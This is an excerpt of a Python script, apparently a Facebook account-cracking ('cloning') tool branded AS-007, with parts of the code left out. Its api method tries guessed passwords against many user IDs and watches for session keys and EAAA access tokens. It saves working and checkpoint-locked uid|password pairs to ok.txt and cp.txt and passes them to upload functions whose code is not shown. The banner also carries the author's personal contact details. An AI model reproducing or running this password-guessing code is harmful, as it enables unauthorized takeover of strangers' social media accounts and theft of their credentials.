...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/itz-as007/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK : Akash Chowdhury ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰AS-007")
	subprocess.check_output(["am", "start", "https://m.me/itz.as007"])
...
class Main:
 ...
 /_/    \_\_____/       \___/ \___//_/      
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Akash Chowdhury  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Facebook Help Centre 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : itz-as007
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01826842231
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: AS-007): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AS-007_OLD] : %s/%s -> \033[0;92m [ AS-007-OK:%s ]- \033[0;91m[AS-007-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AS-007-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AS-007-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[AS-007-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AS-007-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
